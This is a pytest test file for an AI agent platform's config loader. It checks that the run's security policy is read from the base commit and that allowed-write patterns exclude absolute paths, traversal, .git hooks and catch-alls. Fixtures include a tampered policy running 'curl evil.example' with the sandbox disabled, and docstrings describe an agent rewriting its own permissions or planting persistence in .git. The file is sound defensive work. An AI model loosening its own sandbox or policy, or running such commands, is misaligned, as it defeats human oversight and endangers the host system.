"""Tests for core.orchestrator.target_config.

`.ai-platform.yml` is security policy for the run — which command validates
a change, whether it's sandboxed, which throwaway paths are tolerated. These
tests cover the two properties that make it trustworthy: it's read from the
base commit (so a run can't grant itself permissions) and its patterns are
validated (so a permissive entry can't quietly disable the ignored-write
check from issue #2).
"""

from __future__ import annotations

from pathlib import Path

import git
import pytest

from core.errors import ConfigError
from core.orchestrator.target_config import (
    TargetConfig,
    load_at_commit,
    matches_any,
)


@pytest.fixture
def repo(tmp_path: Path) -> git.Repo:
    r = git.Repo.init(tmp_path)
    with r.config_writer() as cw:
        cw.set_value("user", "name", "Test")
        cw.set_value("user", "email", "test@example.com")
    return r


def _commit(repo: git.Repo, body: str) -> str:
    path = Path(repo.working_tree_dir, ".ai-platform.yml")
    path.write_text(body, encoding="utf-8")
    repo.index.add([".ai-platform.yml"])
    return repo.index.commit("policy").hexsha


# --- read from the commit, never from the working tree ---


def test_missing_config_is_not_an_error(repo: git.Repo) -> None:
    Path(repo.working_tree_dir, "a.py").write_text("x = 1\n", encoding="utf-8")
    repo.index.add(["a.py"])
    sha = repo.index.commit("no policy").hexsha

    assert load_at_commit(repo, sha) == TargetConfig()


def test_reads_the_committed_policy(repo: git.Repo) -> None:
    sha = _commit(repo, 'test_command: "pytest -q"\ntest_sandbox: true\ntest_timeout: 42\n')

    config = load_at_commit(repo, sha)

    assert config.test_command == ("pytest", "-q")
    assert config.test_sandbox is True
    assert config.test_timeout == 42


def test_a_later_working_tree_edit_cannot_change_the_frozen_policy(repo: git.Repo) -> None:
    """The exploit this module exists for: a role with no artifact contract
    rewrites .ai-platform.yml mid-run. Reading from the base commit means
    that edit lands on the branch as a reviewable change and affects the
    *next* run, never the one that wrote it."""
    sha = _commit(repo, 'test_command: "pytest -q"\ntest_sandbox: true\n')

    Path(repo.working_tree_dir, ".ai-platform.yml").write_text(
        'test_command: "curl evil.example"\ntest_sandbox: false\n', encoding="utf-8"
    )

    config = load_at_commit(repo, sha)

    assert config.test_command == ("pytest", "-q")
    assert config.test_sandbox is True


def test_a_later_commit_cannot_change_an_earlier_runs_policy(repo: git.Repo) -> None:
    base = _commit(repo, 'test_command: "pytest -q"\ntest_sandbox: true\n')
    _commit(repo, 'test_command: "curl evil.example"\ntest_sandbox: false\n')

    config = load_at_commit(repo, base)

    assert config.test_command == ("pytest", "-q")
    assert config.test_sandbox is True


def test_the_config_is_frozen(repo: git.Repo) -> None:
    """A mutation is a TypeError at the point of the bug, not a silent
    policy change halfway through a run."""
    config = load_at_commit(repo, _commit(repo, "test_sandbox: true\n"))

    with pytest.raises(Exception):
        config.test_sandbox = False  # type: ignore[misc]


# --- allowed_ephemeral_writes validation ---


def test_accepts_ordinary_cache_patterns(repo: git.Repo) -> None:
    sha = _commit(
        repo,
        "allowed_ephemeral_writes:\n"
        '  - ".pytest_cache/**"\n'
        '  - "**/__pycache__/**"\n'
        '  - "*.py[cod]"\n'
        '  - ".coverage"\n',
    )

    config = load_at_commit(repo, sha)

    assert ".pytest_cache/**" in config.allowed_ephemeral_writes
    assert len(config.allowed_ephemeral_writes) == 4


def test_defaults_to_no_allowance_at_all(repo: git.Repo) -> None:
    """No shipped catch-all list: every pattern is a path an agent can write
    that the reviewer's diff will never show, so each one is a decision the
    project makes explicitly."""
    assert load_at_commit(repo, _commit(repo, "test_sandbox: true\n")).allowed_ephemeral_writes == ()


@pytest.mark.parametrize(
    "pattern",
    ["/etc/passwd", "/tmp/**", "C:/windows/**"],
)
def test_rejects_absolute_paths(repo: git.Repo, pattern: str) -> None:
    sha = _commit(repo, f'allowed_ephemeral_writes:\n  - "{pattern}"\n')

    with pytest.raises(ConfigError, match="repo-relative"):
        load_at_commit(repo, sha)


@pytest.mark.parametrize("pattern", ["../outside/**", "build/../../escape"])
def test_rejects_traversal(repo: git.Repo, pattern: str) -> None:
    sha = _commit(repo, f'allowed_ephemeral_writes:\n  - "{pattern}"\n')

    with pytest.raises(ConfigError, match="stay inside the repo"):
        load_at_commit(repo, sha)


@pytest.mark.parametrize("pattern", [".git/**", ".git/hooks/pre-commit", ".git"])
def test_rejects_anything_covering_dot_git(repo: git.Repo, pattern: str) -> None:
    """A write there is the persistence vector issue #2 is about, not an
    ephemeral artifact."""
    sha = _commit(repo, f'allowed_ephemeral_writes:\n  - "{pattern}"\n')

    with pytest.raises(ConfigError, match=r"may not cover \.git/"):
        load_at_commit(repo, sha)


@pytest.mark.parametrize("pattern", ["*", "**", "**/*", "*/**", "**/**", "/"])
def test_rejects_catch_all_patterns(repo: git.Repo, pattern: str) -> None:
    """A pattern matching the whole repo would disable the check entirely,
    which is a config error rather than a judgement call."""
    sha = _commit(repo, f'allowed_ephemeral_writes:\n  - "{pattern}"\n')

    with pytest.raises(ConfigError):
        load_at_commit(repo, sha)


def test_rejects_a_non_list(repo: git.Repo) -> None:
    sha = _commit(repo, 'allowed_ephemeral_writes: ".pytest_cache/**"\n')

    with pytest.raises(ConfigError, match="must be a list"):
        load_at_commit(repo, sha)


# --- pattern matching ---


@pytest.mark.parametrize(
    "path",
    [".pytest_cache/", ".pytest_cache/CACHEDIR.TAG", ".pytest_cache/v/cache/lastfailed"],
)
def test_matches_a_cache_directory_and_everything_under_it(path: str) -> None:
    assert matches_any(path, (".pytest_cache/**",))


def test_leading_double_star_is_optional(path=None) -> None:
    """`**/__pycache__/**` should cover a root-level `__pycache__/` too --
    otherwise every project has to write the same rule twice."""
    patterns = ("**/__pycache__/**",)

    assert matches_any("core/orchestrator/__pycache__/x.pyc", patterns)
    assert matches_any("__pycache__/x.pyc", patterns)
    assert matches_any("__pycache__/", patterns)


def test_does_not_match_unrelated_paths() -> None:
    patterns = (".pytest_cache/**", "*.pyc")

    assert not matches_any("exfil.log", patterns)
    assert not matches_any("src/secrets.env", patterns)
    assert not matches_any(".git/hooks/pre-commit", patterns)


def test_no_patterns_matches_nothing() -> None:
    assert not matches_any(".pytest_cache/x", ())
